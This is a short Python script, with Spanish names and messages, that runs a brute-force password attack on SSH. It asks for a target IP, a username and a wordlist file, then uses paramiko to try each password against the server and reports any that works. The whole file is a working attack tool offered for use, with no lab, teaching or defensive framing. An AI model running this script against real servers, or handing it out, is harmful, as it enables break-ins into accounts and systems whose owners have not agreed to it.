import paramiko
import socket

def ataque_fuerzabruta_ssh(IP, usuario, archivo_contraseñas):
    print(f"Iniciando ataque de fuerza bruta SSH en {IP} con el usuario '{usuario}'")
    cliente = paramiko.SSHClient()
    cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        with open(archivo_contraseñas, 'r', encoding='utf-8') as archivo:
            for lineas in archivo:
                contraseña = lineas.strip()
                if not contraseña:
                    continue
                try:
                    print(f"Probando contraseña: {contraseña}")
                    cliente.connect(IP, username=usuario, password=contraseña, timeout=3)
                    print(f"\n Contraseña Encontrada: {contraseña}")
                    return contraseña
                except paramiko.AuthenticationException:
                    pass
                except socket.timeout:
                    print(f"Conexión agotada para {IP}")
                except Exception as e:
                    print(f"Error de conexión: {e}")
                finally:
                    try:
                        cliente.close()
                    except:
                        pass
        print("Ataque finalizado. No se encontró la contraseña")
    except FileNotFoundError:
        print(f"No se encontró el archivo en la ruta: {archivo_contraseñas}")

if __name__ == "__main__":
    targetIP = input("Ingrese la IP objetivo: ")
    targetusuario = input("Ingrese el nombre de usuario objetivo: ")
    archivo = input("Ingrese la ruta completa donde está el archivo con las contraseñas: ")

    ataque_fuerzabruta_ssh(targetIP, targetusuario, archivo)
